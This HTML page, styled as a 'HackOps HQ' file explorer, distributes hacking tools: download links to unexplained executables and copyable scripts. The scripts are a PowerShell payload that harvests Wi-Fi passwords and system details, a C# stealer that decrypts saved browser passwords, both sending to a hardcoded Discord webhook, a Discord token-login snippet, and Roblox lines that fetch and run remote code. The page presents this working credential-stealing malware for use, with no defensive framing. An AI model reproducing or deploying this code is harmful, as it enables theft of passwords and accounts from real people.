<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <link rel="icon" href="shadowbyte.jpg" type="image/jpeg" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HackOps HQ</title>
  <link href="https://fonts.googleapis.com/css?family=Orbitron&display=swap" rel="stylesheet">
  <style>
    /* Basic Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      height: 100%;
      font-family: 'Orbitron', monospace;
      background: #1a1a1a;
      color: #66cc66;
      overflow-y: auto;
    }
    /* Particles.js Background */
    #particles-js {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #1a1a1a;
      z-index: 0;
    }
    /* Main Content Container */
    .content {
      position: relative;
      z-index: 1;
      width: 90%;
      max-width: 1000px;
      margin: 50px auto;
      padding: 40px;
      background: rgba(0, 0, 0, 0.85);
      border: 1px solid #66cc66;
      border-radius: 10px;
    }
    .content h1 {
      text-align: center;
      font-size: 2.5em;
      margin-bottom: 30px;
    }
    /* Top Buttons */
    .buttons {
      text-align: center;
      margin-bottom: 40px;
    }
    .buttons a button {
      background: transparent;
      border: 2px solid #66cc66;
      padding: 15px 30px;
      font-size: 1.2em;
      color: #66cc66;
      border-radius: 5px;
      margin: 5px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.3s ease;
    }
    .buttons a button:hover {
      background: rgba(102, 204, 102, 0.2);
      transform: scale(1.05);
    }
    /* File Explorer Styles */
    #file-explorer {
      margin-top: 40px;
    }
    #file-explorer h2 {
      font-size: 2em;
      margin-bottom: 20px;
      text-align: left;
    }
    .folder, .file {
      margin-left: 20px;
      margin-bottom: 10px;
    }
    .folder-header {
      cursor: pointer;
      font-size: 1.2em;
      user-select: none;
      margin: 5px 0;
    }
    .folder-contents {
      display: none;
      margin-left: 20px;
    }
    .folder.open .folder-contents {
      display: block;
    }
    /* File Card Styles */
    .file-card {
      border: 1px solid #66cc66;
      border-radius: 5px;
      padding: 10px;
      margin: 5px 0;
    }
    .file-title {
      font-size: 1em;
      margin-bottom: 5px;
    }
    .file-card textarea {
      width: 100%;
      height: 100px;
      background: #2b2b2b;
      color: #66cc66;
      border: none;
      resize: none;
      font-family: 'Orbitron', monospace;
      padding: 5px;
    }
    .file-card button {
      margin-top: 5px;
      background: transparent;
      border: 1px solid #66cc66;
      padding: 5px 10px;
      color: #66cc66;
      cursor: pointer;
    }
    .file-card button:hover {
      background: rgba(102, 204, 102, 0.2);
    }
  </style>
</head>
<body>
  <!-- Particle Background -->
  <div id="particles-js"></div>

  <!-- Main Content -->
  <div class="content">
    <h1>Welcome to HackOps HQ</h1>
    <div class="buttons">
      <a href="https://bleh-xi.vercel.app/Charlottes%20App.exe">
        <button>Charlottes App.exe</button>
      </a>
      <a href="https://bleh-xi.vercel.app/Silly.zip">
        <button>Silly.zip</button>
      </a>
      <a href="https://bleh-xi.vercel.app/POWER.exe">
        <button>POWER.exe</button>
      </a>
    </div>

    <!-- File Explorer Section -->
    <div id="file-explorer">
      <h2>File Explorer</h2>
      <!-- The file explorer content is generated dynamically -->
    </div>
  </div>

  <!-- Particles.js Library -->
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script>
    /* ParticlesJS Configuration */
    particlesJS("particles-js", {
      "particles": {
        "number": {
          "value": 80,
          "density": { "enable": true, "value_area": 800 }
        },
        "color": { "value": "#66cc66" },
        "shape": {
          "type": "circle",
          "stroke": { "width": 0, "color": "#000000" },
          "polygon": { "nb_sides": 5 }
        },
        "opacity": {
          "value": 0.5,
          "random": false,
          "anim": { "enable": false, "speed": 1, "opacity_min": 0.1, "sync": false }
        },
        "size": {
          "value": 3,
          "random": true,
          "anim": { "enable": false, "speed": 40, "size_min": 0.1, "sync": false }
        },
        "line_linked": {
          "enable": true,
          "distance": 150,
          "color": "#66cc66",
          "opacity": 0.4,
          "width": 1
        },
        "move": {
          "enable": true,
          "speed": 6,
          "direction": "none",
          "random": false,
          "straight": false,
          "out_mode": "out",
          "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 }
        }
      },
      "interactivity": {
        "detect_on": "canvas",
        "events": {
          "onhover": { "enable": true, "mode": "repulse" },
          "onclick": { "enable": true, "mode": "push" },
          "resize": true
        },
        "modes": {
          "grab": { "distance": 400, "line_linked": { "opacity": 1 } },
          "bubble": { "distance": 100, "size": 40, "duration": 2, "opacity": 8, "speed": 3 },
          "repulse": { "distance": 100, "duration": 0.4 },
          "push": { "particles_nb": 4 },
          "remove": { "particles_nb": 2 }
        }
      },
      "retina_detect": true
    });

    /* Generic Copy Function */
    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(() => {
        alert("Copied to clipboard!");
      }, () => {
        alert("Failed to copy.");
      });
    }

    /* Define File System Object */
    const fileSystem = {
      name: "root",
      files: [
        {
  name: "Discord Token Login Code.txt",
  content: `function login(token) {
  setInterval(() => {
    document.body.appendChild(document.createElement(\`iframe\`))
      .contentWindow.localStorage.token = \`"\${token}"\`;
  }, 50);
  setTimeout(() => {
    location.reload();
  }, 2500);
}
login('PASTE TOKEN HERE');`
}
      ],
      folders: [
        {
          name: "Applications",
          files: [
            { name: "Charlottes App.exe", url: "https://bleh-xi.vercel.app/Charlottes%20App.exe" },
            { name: "Silly.zip", url: "https://bleh-xi.vercel.app/Silly.zip" },
            { name: "POWER.exe", url: "https://bleh-xi.vercel.app/POWER.exe" }
          ],
          folders: []
        },
        {
          name: "Scripts",
          files: [
            {
              name: "Wifi Script.txt",
              content: `$url="https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";
dir env: >> stats.txt;
Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+\\.\\d+)' >> stats.txt;
(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
| Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
| %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;
$Body=@{ content = "$env:computername Stats from Ducky/Pico"};
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json);
curl.exe -F "file1=@stats.txt" $url;
Remove-Item '.\\stats.txt';
exit`
            }
          ],
          folders: [
            {
              name: "Passwords",
              files: [
                {
                  name: "Passwords.cs",
                  content: `using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;

namespace Big_Silly
{
    public static class Pass
    {
        // Replace with your actual Discord webhook URL.
        private const string WEBHOOK_URL = "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";

        /// <summary>
        /// Reads the Local State file for the given browser and returns the decrypted master key.
        /// </summary>
        public static byte[] GetMasterKey(string browser)
        {
            string localStatePath = string.Empty;
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            switch (browser.ToLower())
            {
                case "edge":
                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Local State");
                    break;
                case "chrome":
                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Local State");
                    break;
                case "opera":
                    localStatePath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Local State");
                    break;
                default:
                    return null;
            }
            if (!File.Exists(localStatePath))
            {
                // Could log that the browser was not found.
                return null;
            }
            try
            {
                string jsonText = File.ReadAllText(localStatePath);
                dynamic localState = JsonConvert.DeserializeObject(jsonText);
                string encryptedKeyB64 = localState["os_crypt"]["encrypted_key"];
                byte[] encryptedKeyWithPrefix = Convert.FromBase64String(encryptedKeyB64);
                // Remove the first 5 bytes (the "DPAPI" prefix)
                byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
                Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length);
                // Decrypt the master key using DPAPI
                byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return masterKey;
            }
            catch (Exception)
            {
                // Log the error if needed.
                return null;
            }
        }

        /// <summary>
        /// Decrypts an individual password (stored as a blob) using the given master key.
        /// </summary>
        public static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
        {
            try
            {
                // Validate the length: 3-byte prefix + 12-byte IV + (ciphertext + 16-byte tag) must be present.
                if (encryptedData == null || encryptedData.Length < (3 + 12 + 16))
                    return "";

                // Skip the first 3 bytes (prefix)
                int ivOffset = 3;
                int ivLength = 12;
                byte[] iv = new byte[ivLength];
                Array.Copy(encryptedData, ivOffset, iv, 0, ivLength);

                // Calculate the length of ciphertext (total length minus prefix, IV, and tag)
                int tagLength = 16;
                int cipherTextLength = encryptedData.Length - 3 - ivLength - tagLength;
                if (cipherTextLength <= 0)
                    return "";

                // Extract ciphertext
                byte[] cipherText = new byte[cipherTextLength];
                Array.Copy(encryptedData, ivOffset + ivLength, cipherText, 0, cipherTextLength);

                // Extract tag (last 16 bytes)
                byte[] tag = new byte[tagLength];
                Array.Copy(encryptedData, encryptedData.Length - tagLength, tag, 0, tagLength);

                // Combine ciphertext and tag in one array as expected by BouncyCastle.
                byte[] cipherTextWithTag = new byte[cipherTextLength + tagLength];
                Array.Copy(cipherText, 0, cipherTextWithTag, 0, cipherTextLength);
                Array.Copy(tag, 0, cipherTextWithTag, cipherTextLength, tagLength);

                // Set up the cipher using BouncyCastle.
                // Create an instance of the AES engine in GCM mode.
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                // 128-bit MAC size is standard for AES-GCM.
                AeadParameters parameters = new AeadParameters(new KeyParameter(masterKey), 128, iv, null);
                cipher.Init(false, parameters); // false for decryption

                // Prepare a buffer to hold the decrypted output.
                byte[] plainText = new byte[cipher.GetOutputSize(cipherTextWithTag.Length)];
                int len = cipher.ProcessBytes(cipherTextWithTag, 0, cipherTextWithTag.Length, plainText, 0);
                cipher.DoFinal(plainText, len);

                // Convert the decrypted bytes to a UTF8 string.
                return Encoding.UTF8.GetString(plainText).TrimEnd('\0');
            }
            catch (Exception ex)
            {
                // Optionally log the exception message.
                Console.WriteLine($"Password decryption failed: {ex.Message}");
                return "Decryption failed";
            }
        }

        /// <summary>
        /// Retrieves login credentials from the browser’s Login Data database.
        /// </summary>
        public static Dictionary<string, (string username, string password)> GetPasswords(string browser)
        {
            var passwords = new Dictionary<string, (string username, string password)>();
            byte[] masterKey = GetMasterKey(browser);
            if (masterKey == null)
                return passwords;

            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string loginDataPath = string.Empty;
            switch (browser.ToLower())
            {
                case "edge":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default\Login Data");
                    break;
                case "chrome":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default\Login Data");
                    break;
                case "opera":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Login Data");
                    break;
                default:
                    return passwords;
            }
            if (!File.Exists(loginDataPath))
                return passwords;

            // Copy the locked database to a temporary file.
            string tempFile = Path.Combine(Path.GetTempPath(), "Loginvault.db");
            try
            {
                File.Copy(loginDataPath, tempFile, true);
            }
            catch (Exception)
            {
                // Log error copying the file if needed.
                return passwords;
            }

            try
            {
                using (var connection = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    connection.Open();
                    using (var command = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", connection))
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                            string username = reader.IsDBNull(1) ? "" : reader.GetString(1);
                            byte[] encryptedPassword = (byte[])reader["password_value"];
                            string decryptedPassword = DecryptPassword(encryptedPassword, masterKey);
                            if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(decryptedPassword))
                            {
                                passwords[url] = (username, decryptedPassword);
                            }
                        }
                    }
                    connection.Close();
                }
            }
            catch (Exception)
            {
                // Log query error if needed.
            }
            try
            {
                File.Delete(tempFile);
            }
            catch (Exception)
            {
                // Log deletion error if needed.
            }
            return passwords;
        }

        /// <summary>
        /// Sends the collected passwords as a text file to the Discord webhook.
        /// </summary>
        public static async Task SendToWebhookAsync(Dictionary<string, (string username, string password)> passwords)
        {
            if (passwords == null || passwords.Count == 0)
            {
                // Optionally log that no passwords were found.
                return;
            }
            StringBuilder sb = new StringBuilder();
            foreach (var kvp in passwords)
            {
                sb.AppendLine($"URL: {kvp.Key}");
                sb.AppendLine($"Username: {kvp.Value.username}");
                sb.AppendLine($"Password: {kvp.Value.password}");
                sb.AppendLine();
            }
            string content = sb.ToString();

            using (var client = new HttpClient())
            using (var form = new MultipartFormDataContent())
            {
                var fileContent = new StringContent(content, Encoding.UTF8, "text/plain");
                form.Add(fileContent, "file", "passwords.txt");

                HttpResponseMessage response = await client.PostAsync(WEBHOOK_URL, form);
                // Optionally check the response status.
            }
        }

        /// <summary>
        /// Extracts passwords from Chrome, Edge, and Opera and sends the combined report via webhook.
        /// </summary>
        public static async Task ExtractAndSendPasswordsAsync()
        {
            var allPasswords = new Dictionary<string, (string username, string password)>();
            foreach (var browser in new string[] { "chrome", "edge", "opera" })
            {
                var browserPasswords = GetPasswords(browser);
                foreach (var kvp in browserPasswords)
                {
                    // If the same URL exists for multiple browsers, the last one will overwrite.
                    allPasswords[kvp.Key] = kvp.Value;
                }
            }
            await SendToWebhookAsync(allPasswords);
        }
    }
}`
                }
              ],
              folders: []
            }
          ]
        },
        {
          name: "Roblox Scripts",
          files: [
            { name: "RuniX Hub.lua", content: "loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowByte098/Hub/refs/heads/main/Hub"))()" }
          ],
          files: [
            { name: "Infinite Yield.lua", content: "loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()" }
          ],
          folders: []
        }
      ]
    };

    /* Render a File Element */
    function renderFile(file) {
      const fileDiv = document.createElement("div");
      fileDiv.className = "file";
      
      const card = document.createElement("div");
      card.className = "file-card";

      const title = document.createElement("div");
      title.className = "file-title";
      title.textContent = "📄 " + file.name;
      card.appendChild(title);

      // If file has content, render as copyable file; if it has a URL, render as downloadable.
      if (file.content !== undefined) {
        const textarea = document.createElement("textarea");
        textarea.readOnly = true;
        textarea.value = file.content;
        card.appendChild(textarea);

        const copyBtn = document.createElement("button");
        copyBtn.textContent = "Copy " + file.name;
        copyBtn.onclick = () => copyToClipboard(file.content);
        card.appendChild(copyBtn);
      } else if (file.url !== undefined) {
        const downloadLink = document.createElement("a");
        downloadLink.href = file.url;
        downloadLink.download = file.name;
        const downloadBtn = document.createElement("button");
        downloadBtn.textContent = "Download " + file.name;
        downloadLink.appendChild(downloadBtn);
        card.appendChild(downloadLink);
      }
      fileDiv.appendChild(card);
      return fileDiv;
    }

    /* Render a Folder (Recursively) */
    function renderFolder(folder) {
      const folderDiv = document.createElement("div");
      folderDiv.className = "folder";

      const header = document.createElement("div");
      header.className = "folder-header";
      header.textContent = "📁 " + folder.name;
      header.onclick = () => folderDiv.classList.toggle("open");
      folderDiv.appendChild(header);

      const contents = document.createElement("div");
      contents.className = "folder-contents";

      // Render all files in this folder.
      folder.files.forEach(f => {
        contents.appendChild(renderFile(f));
      });
      // Recursively render subfolders.
      folder.folders.forEach(subfolder => {
        contents.appendChild(renderFolder(subfolder));
      });
      folderDiv.appendChild(contents);
      return folderDiv;
    }

    /* Render the Entire File Explorer */
    function renderFileExplorer(fs) {
      const explorer = document.getElementById("file-explorer");
      // Render files in the root.
      fs.files.forEach(file => {
        explorer.appendChild(renderFile(file));
      });
      // Render folders in the root.
      fs.folders.forEach(folder => {
        explorer.appendChild(renderFolder(folder));
      });
    }

    document.addEventListener("DOMContentLoaded", () => {
      renderFileExplorer(fileSystem);
    });
  </script>
</body>
</html>
